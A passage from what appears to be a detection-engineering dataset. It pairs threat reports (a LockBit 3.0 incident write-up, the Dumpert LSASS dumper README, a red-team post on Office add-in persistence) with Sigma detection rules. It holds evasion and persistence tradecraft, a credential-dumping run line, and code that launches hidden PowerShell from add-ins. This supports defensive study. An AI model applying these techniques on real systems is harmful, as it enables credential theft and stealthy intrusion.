Strike beacon deployed to the host:\n\n- `C:\\ProgramData\\VGAuthService\\VGAuthService.exe`\n- `C:\\ProgramData\\VGAuthService\\VGAuthService.dll,DllRegisterServer`\n\n### Defence Evasion\n\nDeployment of a batch script named `123.bat` was observed on multiple hosts and was deployed via PsExec. The script possessed the capabilities to uninstall Sophos, disable Windows Defender and terminate running services where the service name contained specific strings.\n\nThe ransomware binary used also clears key Windows event log files including Application, System and Security. It also prevents any further events from being written by targeting the EventLog service.\n\n### Discovery\n\nBloodhound was executed days after the initial SocGholish infection on the patient zero host. The output file was created in the `C:\\ProgramData` directory and had the file extension `.bac` instead of the usual `.zip`, however this file was still a zip archive.\n\nA TGS ticket for a single account was observed on patient zero in a text file under `C:\\ProgramData`. It is highly likely the threat actor was gathering the ticket to attempt to crack the password, associated with the account, offline.\n\nSeatbelt [2] was also executed on the patient zero host alongside Bloodhound. Security-orientated information about the host gathered by Seatbelt was outputted to the file `C:\\ProgramData\\seat.txt`.\n\n### Lateral Movement\n\nThe following methods were utilized to move laterally throughout the victim network:\n\n- Cobalt Strike remotely installed temporary services on targeted hosts which executed a Cobalt Strike beacon. An example command line of what the services were configured to run is provided below:\n\n  ```\n  rundll32.exe c:\\programdata\\svchost1.dll,DllRegisterServer\n  ```\n\n- RDP sessions were established using a high privileged account the threat actor had compromised prior.\n\n### Collection\n\n7zip was deployed by the adversary to compress and stage data from folders of interest which had been browsed during RDP sessions.\n\n### Command and Control\n\nCobalt Strike was the primary C2 framework utilized by the threat actor to maintain their presence on the estate as well as laterally move.\n\n### Exfiltration Using MegaSync\n\nBefore deploying the ransomware to the network, the threat actor began to exfiltrate data to Mega, a cloud storage provider. This was achieved by downloading Mega sync software onto compromised hosts, allowing for direct upload of data to Mega.\n\n### Impact\n\nThe ransomware was pushed out to the endpoints using PsExec and impacted both servers and end-user devices. The ransomware executable was named `zzz.exe` and was located in the following folders:\n\n- `C:\\Windows`\n- `C:\\ProgramData`\n- `C:\\Users\\<user>\\Desktop`\n\n---\n\n## Recommendations\n\n1. Ensure that both online and offline backups are taken and test the backup plan regularly to identify any weak points that could be exploited by an adversary.\n2. Restrict internal RDP and SMB traffic so that only hosts that are required to communicate via these protocols are allowed to.\n3. Monitor firewalls for anomalous spikes in data leaving the network.\n4. Block traffic to cloud storage services such as Mega which have no legitimate use in a corporate environment.\n5. Provide regular security awareness training.\n\nIf you have been impacted by LockBit, or currently have an incident and would like support, please contact our Cyber Incident Response Team on +44 161 209 5148 or email cirt@nccgroup.com.\n\n---\n\n## Indicators of Compromise\n\n| IOC Value                                                                         | Indicator Type | Description                                                |\n| --------------------------------------------------------------------------------- | -------------- | ---------------------------------------------------------- |\n| orangebronze[.]com                                                                | Domain         | Cobalt Strike C2 server                                    |\n| 194.26.29[.]13                                                                    | IP Address     | Cobalt Strike C2 server                                    |\n| C:\\ProgramData\\svchost1.dll C:\\ProgramData\\conhost.dll C:\\ProgramData\\svchost.dll | File Path      | Cobalt Strike beacons                                      |\n| C:\\ProgramData\\VGAuthService\\VGAuthService.dll                                    | File Path      | Cobalt Strike beacon deployed by SocGholish                |\n| C:\\Windows\\zzz.exe C:\\ProgramData\\zzz.exe C:\\Users\\<user>\\Desktop\\zzz.exe         | File Path      | Ransomware Executable                                      |\n| c:\\users\\<user>\\appdata\\local\\megasync\\megasync.exe                               | File Path      | Mega sync software                                         |\n| C:\\ProgramData\\PsExec.exe                                                         | File Path      | PsExec                                                     |\n| C:\\ProgramData\\123.bat                                                            | File Path      | Batch script to tamper with security software and services |\n| D826A846CB7D8DE539F47691FE2234F0FC6B4FA0                                          | SHA1 Hash      | C:ProgramData123.bat                                       |\n\n---\n\n## MITRE ATT&CK®\n\n| Tactic              | Technique                                                             | ID        | Description                                                                                 |\n| ------------------- | --------------------------------------------------------------------- | --------- | ------------------------------------------------------------------------------------------- |\n| Initial Access      | Drive-by Compromise                                                   | T1189     | Initial access was gained via infection of SocGholish malware caused by a drive-by-download |\n| Execution           | Command and Scripting Interpreter: Windows Command Shell              | T1059.003 | A batch script was utilized to execute malicious commands                                   |\n| Execution           | Command and Scripting Interpreter: PowerShell                         | T1059.001 | PowerShell was utilized to execute malicious commands                                       |\n| Execution           | System Services: Service Execution                                    | T1569.002 | Cobalt Strike remotely created services to execute its payload                              |\n| Execution           | System Services: Service Execution                                    | T1569.002 | PsExec creates a service to perform it’s execution                                          |\n| Persistence         | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 | SocGholish established persistence through a startup folder                                 |\n| Defence Evasion     | Impair Defenses: Disable or Modify Tools                              | T1562.001 | 123.bat disabled and uninstalled Anti-Virus software                                        |\n| Defence Evasion     | Indicator Removal on Host: Clear Windows Event Logs                   | T1070.001 | The ransomware executable cleared Windows event log files                                   |\n| Discovery           | Domain Trust Discovery                                                | T1482     | The threat actor executed Bloodhound to map out the AD environment                          |\n| Discovery           | Domain Trust Discovery                                                | T1482     | A TGS ticket for a single account was observed in a text file created by the threat actor   |\n| Discovery           | System Information Discovery                                          | T1082     | Seatbelt was ran to gather information on patient zero                                      |\n| Lateral Movement    | SMB/Admin Windows Shares                                              | T1021.002 | Cobalt Strike targeted SMB shares for lateral movement                                      |\n| Lateral Movement    | Remote Services: Remote Desktop Protocol                              | T1021.001 | RDP was used to establish sessions to other hosts on the network                            |\n| Collection          | Archive Collected Data: Archive via Utility                           | T1560.001 | 7zip was utilized to create archives containing data from folders of interest               |\n| Command and Control | Application Layer Protocol: Web Protocols                             | T1071.001 | Cobalt Strike communicated with its C2 over HTTPS                                           |\n| Exfiltration        | Exfiltration Over Web Service: Exfiltration to Cloud Storage          | T1567.002 | The threat actor exfiltrated data to Mega cloud storage                                     |\n| Impact              | Data Encrypted for Impact                                             | T1486     | Ransomware was deployed to the estate and impacted both servers and end-user devices        |\n\n---\n\n## References\n\n1. https://www.bleepingcomputer.com/news/security/conti-ransomware-finally-shuts-down-data-leak-negotiation-sites/\n2. https://github.com/GhostPack/Seatbelt",
    "sigma_rule": {
      "title": "Suspicious Group And Account Reconnaissance Activity Using Net.EXE",
      "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0",
      "status": "test",
      "description": "Detects suspicious reconnaissance command line activity on Windows systems using Net.EXE\nCheck if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)\n",
      "references": [
        "https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/",
        "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/",
        "https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, @svch0st, Nasreddine Bencherchali (Nextron Systems)",
      "date": "2019-01-16",
      "modified": "2023-03-02",
      "tags": [
        "attack.discovery",
        "attack.t1087.001",
        "attack.t1087.002"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\net.exe",
              "\\net1.exe"
            ]
          },
          {
            "OriginalFileName": [
              "net.exe",
              "net1.exe"
            ]
          }
        ],
        "selection_group_root": {
          "CommandLine|contains": [
            " group ",
            " localgroup "
          ]
        },
        "selection_group_flags": {
          "CommandLine|contains": [
            "domain admins",
            " administrator",
            " administrateur",
            "enterprise admins",
            "Exchange Trusted Subsystem",
            "Remote Desktop Users",
            "Utilisateurs du Bureau à distance",
            "Usuarios de escritorio remoto",
            " /do"
          ]
        },
        "filter_group_add": {
          "CommandLine|contains": " /add"
        },
        "selection_accounts_root": {
          "CommandLine|contains": " accounts "
        },
        "selection_accounts_flags": {
          "CommandLine|contains": " /do"
        },
        "condition": "selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)"
      },
      "falsepositives": [
        "Inventory tool runs",
        "Administrative activity"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_net_groups_and_accounts_recon.yml"
  },
  "6": {
    "url": "https://github.com/outflanknl/Dumpert",
    "markdown": "# Dumpert\n\n## Folders and Files\n\n- Dumpert-Aggressor\n- Dumpert-DLL\n- Dumpert\n- README.md\n\n## README\n\n**Dumpert, an LSASS memory dumper using direct system calls and API unhooking**\n\nRecent malware research shows that there is an increase in malware that is using direct system calls to evade user-mode API hooks used by security products. This tool demonstrates the use of direct System Calls and API unhooking and combines these techniques in a proof of concept code which can be used to create a LSASS memory dump using Cobalt Strike, while not touching disk and evading AV/EDR monitored user-mode API calls.\n\nMore info about the used techniques can be found on the following Blog: Red Team Tactics: Combining Direct System Calls and sRDI to Bypass AV/EDR\n\nTwo versions of the code are included:\n\nAn executable and a DLL version of the code. The DLL version can be run as follows:\n\n```\nrundll32.exe C:\\Dumpert\\Outflank-Dumpert.dll,Dump\n```\n\nAlso, an sRDI version of the code is provided, including a Cobalt Strike aggressor script. This script uses shinject to inject the sRDI shellcode version of the dumpert DLL into the current process. Then it waits a few seconds for the lsass minidump to finish and finally downloads the minidump file from the victim host.\n\n## Compile instructions:\n\nThis project is written in C and assembly. You can use Visual Studio to compile it from source.\n\nThe sRDI code can be found here: sRDI GitHub Repository",
    "sigma_rule": {
      "title": "HackTool - Dumpert Process Dumper Execution",
      "id": "2704ab9e-afe2-4854-a3b1-0c0706d03578",
      "status": "test",
      "description": "Detects the use of Dumpert process dumper, which dumps the lsass.exe process memory",
      "references": [
        "https://github.com/outflanknl/Dumpert",
        "https://unit42.paloaltonetworks.com/actors-still-exploiting-sharepoint-vulnerability/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2020-02-04",
      "modified": "2025-01-22",
      "tags": [
        "attack.credential-access",
        "attack.t1003.001"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Hashes|contains": "MD5=09D278F9DE118EF09163C6140255C690"
          },
          {
            "CommandLine|contains": "Dumpert.dll"
          }
        ],
        "condition": "selection"
      },
      "falsepositives": [
        "Very unlikely"
      ],
      "level": "critical"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_hktl_dumpert.yml"
  },
  "7": {
    "url": "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/",
    "markdown": "",
    "sigma_rule": {
      "title": "File Decryption Using Gpg4win",
      "id": "037dcd71-33a8-4392-bb01-293c94663e5a",
      "status": "test",
      "description": "Detects usage of Gpg4win to decrypt files",
      "references": [
        "https://blogs.vmware.com/security/2022/11/batloader-the-evasive-downloader-malware.html",
        "https://www.gpg4win.de/documentation.html",
        "https://news.sophos.com/en-us/2022/01/19/zloader-installs-remote-access-backdoors-and-delivers-cobalt-strike/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-08-09",
      "tags": [
        "attack.execution"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_metadata": [
          {
            "Image|endswith": [
              "\\gpg.exe",
              "\\gpg2.exe"
            ]
          },
          {
            "Description": "GnuPG’s OpenPGP tool"
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            " -d ",
            "passphrase"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_gpg4win_decryption.yml"
  },
  "8": {
    "url": "https://labs.withsecure.com/publications/add-in-opportunities-for-office-persistence",
    "markdown": "# Add-In Opportunities for Office Persistence\n\n21 April, 2017\n\n## Introduction\n\nOne software product that attackers will almost certainly find in the environments that they're targeting is Microsoft Office. Office applications due to this ubiquity present a consistent source of opportunity for persistence mechanisms.\n\nThis post will explore various opportunities for gaining persistence through native Microsoft Office functionality. It was inspired by Kostas Lintovois’ similar work which identified ways to persist in transient Virtual Desktop Infrastructure (VDI) environments through adding a VBA backdoor to Office template files (“One Template to Rule ‘Em All”).\n\nThe following opportunities for Office-based persistence will be discussed, along with the relative benefits and disadvantages of each (from a red team perspective as we’re talking about obtaining persistence):\n\n1. WLL and XLL add-ins for Word.\n2. VBA add-ins for Excel and PowerPoint.\n3. COM add-ins for all Office products.\n4. Automation add-ins for Excel.\n5. VBA editor (VBE) add-ins for all VBA using Office products.\n6. VSTO add-ins for all Office products.\n\nThe described persistence techniques were tested with Office 2013 running on Windows 7, 8.1, and 10.\n\n## WLL and XLL “Add-Ins” for Word and Excel\n\nKey to the work by Kostas and others on persistence using Office templates was the concept of “Trusted Locations”. Files located here containing VBA code are not subject to the standard restrictions imposed by the macro settings, and the code will be executed without warning even if macros are disabled. Further research, however, found that certain trusted locations to which a typical standard user has write privileges could also be used to host DLL-based add-ins.\n\n### WLL “Add-Ins” for Word\n\nThe three default locations for Word are shown below. It can be seen that the purposes of the trusted locations are split between “templates” and “StartUp” functionality.\n\n```image\nAlt: WLL1\nDescription: The image shows a screenshot of the trusted locations settings in Microsoft Word 2013. It highlights three specific paths designated as trusted sources for opening files, with a focus on the 'StartUp' directory. This directory is indicated as a default location for Word 2013 and is crucial for the operation of WLL add-ins, which can lead to arbitrary code execution when Word starts.\nTranscription: |\n  Trusted Locations\n  \n  Warning: All these locations are treated as trusted sources for opening files. If you change or add a location, make sure that the new location is secure.\n  \n  User Locations\n  \n  Path                                                                      Description\n  C:\\...AppData\\Roaming\\Microsoft\\Templates\\                                Word 2013 default location: User Templates\n  C:\\...Files (x86)\\Microsoft Office\\Templates\\                             Word 2013 default location: Application Tem...\n  C:\\...ata\\Roaming\\Microsoft\\Word\\Startup\\                                 Word 2013 default location: StartUp\n  \n  Policy Locations\n```\n\nFurther investigation of this “StartUp” trusted location found that it could host “Word Add-Ins” of a “*.wll” extension. This is an archaic extension dating back to the days of Word 97 but appears to still be supported, and there’s little documentation on how to actually create such a file. After some research, it was identified that a “*.wll” file is essentially a DLL with additional “Office-specific extensions”. This means it supports basic DLL functionality, and therefore you can just rename a “*.dll” to a “*.wll”, put it in the “StartUp” trusted location which defaults to a location within the user’s home directory, and get arbitrary code execution when Word starts, all from a low privileged user.\n\nAn example of this can be seen below, where a WLL add-in launches \"calc.exe\", and can be seen running as a child of the Word process, \"WINWORD.EXE\".\n\n```image\nAlt: calc-process-tree\nDescription: The image is a screenshot of a task management interface displaying the process tree of two applications: 'WINWORD.EXE' (Microsoft Word) and 'calc.exe' (Windows Calculator). The image includes various metrics for these processes, such as CPU usage, private bytes allocated, and working set memory. Each process is accompanied by its respective process ID (PID), description, company name, and integrity level. This information illustrates the relationship between the two processes, highlighting the execution of 'calc.exe' as a child process of 'WINWORD.EXE', relevant to the discussion of WLL add-ins for persistence in Microsoft Word.\nTranscription: |\n  Process         | CPU  | Private Bytes | Working Set | PID  | Description        | Company Name         | Integrity\n  -----------------------------------------------------------------------------------------------------------\n  WINWORD.EXE     | 0.68 | 19,928 K      | 44,764 K    | 2100 | Microsoft Word     | Microsoft Corporation | Medium\n    calc.exe      | 0.07 | 7,156 K       | 13,640 K    | 4968 | Windows Calculator | Microsoft Corporation | Medium\n```\n\nFor anyone testing this with DLLs generated through Metasploit's \"msfvenom\" you’ll find that the payload gets executed when Word starts but Word then crashes. I found that constructing a bare bones C++ DLL that executed code directly within DllMain resolved the issue and allowed Word to continue execution.\n\nOne interesting behavior of Word for WLL add-ins is that despite being loaded automatically, and their containing code executed, Word lists them as an “inactive” add-in. Furthermore, and potentially because of this, disabling add-ins within Word’s Trust Center does not disable WLL add-ins.\n\n```image\nAlt: WLL3\nDescription: The image depicts a screenshot of the 'Add-Ins' section within Microsoft Word. It shows a list of inactive application add-ins, highlighting an entry named 'InconspicuousWLLAddIn.wll', indicating its file path and type as a Word Add-in. This visual is relevant to the context of Word add-ins and their potential security implications, as it illustrates how certain add-ins can be listed as inactive while still being present in the system.\nTranscription: |\n  Inactive Application Add-ins\n  \n  InconspicuousV4LAddIn.vll      C:\\...LAddIn.vll      Word Add-in\n```\n\n### XLL “Add-Ins” for Excel\n\nExcel has a similar means of extending its functionality using DLLs which are known as XLL add-ins, and have the “*.xll” extension. Unlike WLL add-ins which are automatically loaded when Word opens, Excel needs to be configured to use an XLL add-in through adding a property to an existing registry key. This key is located at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nAn “OPEN” property should be added which contains the value of “/R FileNameOfAddIn.xll”.\n\n```image\nAlt: XLL1\nDescription: The image shows a screenshot of a Windows Registry Editor window displaying a specific key related to Excel add-ins. The highlighted section shows the 'OPEN' property under the registry key path corresponding to Excel options, indicating that an XLL add-in is configured to load by specifying its filename. This visual directly relates to the context provided, illustrating how XLL add-ins are set up in Excel.\nTranscription: |\n  OPEN\n  REG_SZ\n  /R XLLAddIn.xll\n```\n\nA full path does not need to be specified, as Excel defaults to looking in “%appdata%\\Microsoft\\AddIns” for the add-in file. Interestingly, this location is not specified in the trusted locations as was the case with WLL add-ins. This is potentially because the trusted locations are primarily focused on providing security controls around VBA execution.\n\nThe way that Excel uses XLL add-ins also differs from the way Word uses WLL add-ins. For each configured XLL add-in, Excel will look for exported functions in the DLL and call them as appropriate. For example, Excel will look for and call a function with the name of “xlAutoOpen” when the process first loads. This function as the name suggests mimics the behavior of VBA’s “Auto_Open()”.\n\nUnlike WLL add-ins, XLL add-ins are listed as being “active” within Excel’s add-in manager, and can be prevented from loading by disabling add-ins within the Trust Center.\n\n#### Benefits\n\n1. No administrative rights needed to write to the user’s “StartUp” location, or configure registry keys.\n2. Automatically loaded for Word, and only minimal registry edits are required for Excel.\n3. WLL add-ins are not prevented from loading by enabling “Disable all Application Add-ins”. This does not apply to XLL add-ins.\n4. WLL add-ins are listed as being \"Inactive\" in Word's GUI for monitoring add-ins, despite actually being \"Active\". This does not apply to XLL add-ins.\n5. They can potentially be used for persistence in Virtual Desktop Infrastructure (VDI) environments.\n\n#### Disadvantages\n\n1. Dropping a DLL into \"%appdata%\".\n2. Registry edits are required for XLL add-ins.\n\n## VBA “Add-Ins” for Excel and PowerPoint\n\nSimilar to Word, both Excel and PowerPoint have an equivalent “StartUp” trusted location. In fact, they each have two – one that’s user-specific and one that’s system-wide. The user-specific trusted locations (as that’s where a low privilege user will have write permissions) are referred to as “XLSTART” and “AddIn” for Excel and PowerPoint respectively.\n\nThese trusted locations are not intended to store DLL-based add-ins, but instead ones that are VBA-based with a non-standard extension intended specifically for add-ins.\n\nThis particular persistence vector most closely aligns with Kostas’ work on template persistence. The key distinction between the two approaches is that when VBA is included within a template, it is only executed in documents that derive from that template. VBA add-ins will execute for their specific event handlers whenever any document is opened within Excel and PowerPoint regardless of their originating template, but this functionality is limited to these two Office applications.\n\nThe approach to implementing each persistence vector is described below.\n\n### Excel\n\nCreate a new Excel spreadsheet, open the VBA editor, and insert a \"Module\" which contains the persistence mechanism.\n\n```image\nAlt: VBA-EX-1\nDescription: The image depicts a screenshot of the Microsoft Visual Basic for Applications (VBA) editor. It shows a project named 'VBAProject' with various components such as 'Microsoft Excel Objects' and 'Modules'. The code pane displays a subroutine named 'Auto_Open', which creates an object of 'WScript.Shell' and executes a file named 'calc.exe'. This example illustrates a method for using VBA in Excel for executing code upon opening a spreadsheet, relevant to the concept of persistence mechanisms in cyber threats.\nTranscription: |\n  vba\n  Sub Auto_Open()\n      Set objShell = CreateObject(\"WScript.Shell\")\n      objShell.Exec (\"calc.exe\")\n  End Sub\n```\n\nGo to save the spreadsheet, but instead of choosing a standard Excel format choose select “Excel Add-In” from the type menu which uses “*.xlam” or “*.xla” depending on the compatibility mode. This should be saved to the appropriate trusted location which is typically “%appdata%\\Microsoft\\Excel\\XLSTART”.\n\n```image\nAlt: VBA-EX-2\nDescription: The image depicts a 'Save As' dialog box from Microsoft Excel, showing the file path to the XLSTART folder. It highlights the selected file name 'InconspicuousAddIn.xlam' with the file type set to 'Excel Add-In (*.xlam)'. This image illustrates the process of saving an Excel file as an add-in, which is relevant to creating persistence mechanisms in VBA for Excel.\nTranscription: |\n  Save As\n  \n  Roaming > Microsoft > Excel > XLSTART\n  \n  File name: InconspicuousAddIn.xlam\n  Save as type: Excel Add-In (*.xlam)\n  \n  Save | Cancel\n```\n\nWhen Excel is next opened the add-in will be executed regardless of whether it’s a new spreadsheet or one that’s been previously saved.\n\n### PowerPoint\n\nPowerPoint VBA Add-Ins can be created in the same manner as with Excel, but in this case the file format is \"*.ppam\" or \"*.ppa\". The add-in should then be stored in the appropriate Trusted Location, which as mentioned previously this is referred to as “AddIns” in the case of PowerPoint. It is also typically located at the rather generic looking location of “%appdata%\\Microsoft\\AddIns”, which is also used for the XLL add-ins.\n\nUnlike with Excel, PowerPoint add-ins are not automatically loaded but can be configured to through modifying the registry. Thankfully such modification only needs to occur in the HKEY_CURRENT_USER (HKCU) hive. This involves creating a key at the following location:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\15.0\\PowerPoint\\AddIns\\<AddInName>\n```\n\nNote that the Office number may also need to be changed, and the 15.0 here refers to Office 2013. This key should then have the following properties. “Autoload” is set to “1” to indicate that it should load the add-in automatically when PowerPoint starts. A full “Path” to the add-in does not need to be provided as PowerPoint is aware of the location it is required to load add-ins from.\n\n```image\nAlt: VBA-PP-1\nDescription: The image displays a screenshot of the Windows Registry Editor, specifically a section related to PowerPoint add-ins. It shows the registry path for an add-in named 'InconspicuousAddIn.ppam' under the 'AddIns' directory. The registry keys include '(Default)', 'AutoLoad', and 'Path', with 'AutoLoad' set to '1', indicating that the add-in is configured to load automatically when PowerPoint starts. The structure and values depicted provide technical details relevant to configuring PowerPoint VBA add-ins.\nTranscription: |\n  Outlook\n    PowerPoint\n      AddInLoadTimes\n      AddIns\n        InconspicuousName\n  \n  Name          Type        Data\n  (Default)     REG_SZ      (value not set)\n  AutoLoad      REG_DWORD   0x00000001 (1)\n  Path          REG_SZ      InconspicuousAddIn.ppam\n```\n\n#### Benefits\n\n1. No administrative rights needed.\n2. Automatically loaded for Excel.\n3. \"Trusted Location\" so there are no problems executing VBA.\n4. Despite the file type being an “Add-In”, the “Disable all Application Add-Ins” option does not prevent the VBA code from executing.\n5. You can password protect the Add-In for viewing and editing – but it will still be executed.\n6. It can potentially be used for persistence in VDI environments.\n\n#### Disadvantages\n\n1. Having to endure the excruciating process of writing VBA code.\n2. In the case of PowerPoint VBA Add-Ins having to write to the registry.\n3. Dropping additional files to disk for both Excel and PowerPoint.\n\n## Office COM Add-Ins\n\nA wholly different way to create add-ins for Office is “COM add-ins”. Due to the manner in which COM add-ins work, it is possible to create a single add-in and have this integrated into all Office applications (including Outlook). For example, to run code when such Office programs open.\n\nCOM objects (which are stored as “*.dll” files, although are different from traditional DLLs) must be registered (in the registry) before use. Primarily this involves notifying Windows about the COM object (i.e., setting it up in the HKEY_CLASSES_ROOT hive). This registration process is defined in the function specified with a “ComRegisterFunctionAttribute” attribute.\n\nOffice applications must then be further configured to use this COM object which involves creating a single registry key with three properties. This key must be created per application. The registry key required to tell an Office program to load the COM add-in is stored at:\n\n```\nHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Program>\\Addins\\<AddInName>\n```\n\nIn this example, “3” for “LoadBehaviour” specifies that the Office application (here Outlook) should load the COM add-in at startup, and the COM add-in is referenced through a “FriendlyName”.\n\n```image\nAlt: COM-1\nDescription: The image displays a registry editor view showcasing the registry keys related to COM add-ins for Outlook. On the left side, it shows the 'Addins' folder with entries for various add-ins, including 'InconspicuousAddIn.Connect'. The right side displays the details of the selected add-in, including its 'Description', 'FriendlyName', and 'LoadBehavior' values, which indicate how the add-in is configured to behave within Outlook. This image is relevant to the context as it illustrates the registry settings necessary for deploying COM add-ins.\nTranscription: |\n  Outlook\n    Addins\n      AccessAddin.DC\n      ColleagueImport.ColleagueImportAddin\n      InconspicuousAddin.Connect\n      TelemetryAddin.Connect\n  \n  Name                  Type        Data\n  (Default)             REG_SZ      (value not set)\n  Description           REG_SZ      Outlook Inconspicuous Addin\n  FriendlyName          REG_SZ      Outlook Inconspicuous Addin\n  LoadBehavior          REG_DWORD   0x00000003 (3)\n```\n\nThe creation of the Office application keys can also be performed within the same function that is handling COM registration. A key benefit of this is allowing the actions to deploy the persistence mechanism to be bundled together thus reducing the number of commands that need to be run to set it up – in this case one using “regasm.exe”.\n\nWith regards to getting code execution once an Office application loads the COM object, a good location for this in the code is in the \"OnConnection\" function of the Office-specific \"IDTExtensibility2\" interface. This interface deals with add-in related events, such as for when an add-in is loaded (as with \"OnConnection\") and unloaded. The example below shows a hidden cmd window spawning calc.\n\n```\npublic void OnConnection(object application, Extensibility.ext_ConnectMode connectMode, object addInInst, ref System.Array custom)\n{\n    /* snip */\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n}\n```\n\nOnce the COM add-in has been created it can be deployed as follows using regasm.exe which invokes the registration function. This action requires administrative privileges as it writes to HKEY_CLASSES_ROOT.\n\n```image\nAlt: COM-3\nDescription: The image depicts a command prompt window displaying the output of a command used to register a .NET assembly with the Regasm utility. It shows the command executed, along with a warning indicating that registering an unsigned assembly may interfere with other applications. The output confirms that types were registered successfully. The command prompt is titled 'Administrator: Command Prompt', indicating it was run with administrative privileges.\nTranscription: |\n  C:\\>C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe\" /codebase \"C:\\Users\\wk\\AppData\\Roaming\\Microsoft\\Office\\InconspicuousCOMAddIn.dll\"\n  \n  Microsoft .NET Framework Assembly Registration Utility version 4.0.30319.33440\n  for Microsoft .NET Framework version 4.0.30319.33440\n  Copyright (C) Microsoft Corporation. All rights reserved.\n  \n  RegAsm : warning RA0000 : Registering an unsigned assembly with /codebase can cause your assembly to interfere with\n  other applications that may be installed on the same computer. The /codebase switch is intended to be used only with\n  signed assemblies. Please give your assembly a strong name and re-register it.\n  \n  Types registered successfully\n```\n\nIn the example presented above, the add-in will be loaded when Outlook opens and we’ll be presented with calc.\n\n#### Benefits\n\n1. Easy to create a single add-in that works across multiple Office products without adaptation.\n2. One command to setup (regasm).\n\n#### Disadvantages\n\n1. Dropping the COM \"*.dll\" file to disk, and the registry edits required for it to be registered and automatically loaded.\n2. Requires administrative rights for COM registration.\n3. Unlikely to be useful for persistence in VDI environments.\n\n## Excel Automation Add-In\n\nAs part of its intention to be extensible Excel allows the creation of user-defined functions. Such functions would be executed, for example, as part of cell formulae (where “=SUM()” is an example of a built-in function). These user-defined functions are stored in what is known as “Automation Add-Ins”. They’re created in a similar manner to COM Add-Ins, but have this specific use case.\n\nThere is a registration function as usual with COM, which can also include code to set up the registry to notify Excel that it should load this add-in at run time. This key required is located at:\n\n```\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Office\\15.0\\Excel\\Options\n```\n\nEach Automation add-in is listed as the value of a single “OPENx” property, where x is an incrementing number if multiple add-ins are enabled at one time.\n\n```image\nAlt: AUTO1\nDescription: The image displays a screenshot of a Windows Registry Editor window showing the registry path related to Excel add-ins. It specifically highlights the 'Options' section under 'Excel' where an entry for 'OPEN' is listed. This entry indicates a user-defined function under the name 'InconspicuousAddIn.ExtFunctions'. The screenshot provides a visual representation of the registry settings that facilitate the use of Automation Add-Ins in Excel, making it relevant to the topic of persistence mechanisms.\nTranscription: |\n  plaintext\n  Excel\n    AddInLoadTimes\n    File MRU\n    Options\n    Place MRU\n  \n  Name           Type        Data\n  (Default)      REG_SZ      (value not set)\n  FirstRun       REG_DWORD   0x00000000 (0)\n  OPEN           REG_SZ      /A \"InconspicuousAddIn.ExtFunctions\"\n  OptionFormat   REG_BINARY  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n```\n\nIn terms of getting an Automation add-in to actually do something useful for the purposes of persistence, you define user-defined functions simply as standard functions within a particular namespace (here “InconspicuousAddIn”) and class (here “ExtFunctions”) which gets referenced in the above registry property. The function can do anything a normal function can, including executing arbitrary commands. The example below shows a user-defined function that counts the number of cells in a selected range after it opens calc.\n\n```\npublic double CountCellsRange(object range)\n{\n    System.Diagnostics.Process process = new System.Diagnostics.Process();\n    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\n    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\n    startInfo.FileName = \"powershell.exe\";\n    startInfo.Arguments = \"-ep bypass -C calc\";\n    process.StartInfo = startInfo;\n    process.Start();\n\n    Excel.Range count = range as Excel.Range;\n    return count.Cells.Count;\n}\n```\n\nTo deploy the persistence mechanism, as Excel Automation add-ins are COM-based, regasm can be used once again using the same syntax as for the COM add-in. As can be seen below, post-regasm, the Automation add-in is now enabled:\n\n```image\nAlt: AUTO2\nDescription: The image shows a dialog box from Microsoft Excel displaying the 'Add-Ins' menu. It highlights the 'InconspicuousAddIn.ExtFunctions' as an enabled automation add-in. The dialog includes a list of available automation servers and indicates the file path for the add-in's DLL. The interface suggests interaction with user-defined functions in Excel, relevant to the context of creating persistence mechanisms using automation add-ins.\nTranscription: |\n  Top Window: Add-Ins\n  \n  Add-Ins available:\n  \n  ☑ Agptest  \n  ☑ Analysis ToolPak  \n  ☑ Analysis ToolPak - VBA  \n  ☑ InconspicuousAddin.ExtFunctions  \n  ☐ ZigZag  \n  \n               [OK] [Cancel] [Browse...] [Automation...]\n  \n  ---\n  \n  **Bottom Window: Automation Servers**\n  \n  _Title:_ **Automation Servers**\n  \n  Automation servers 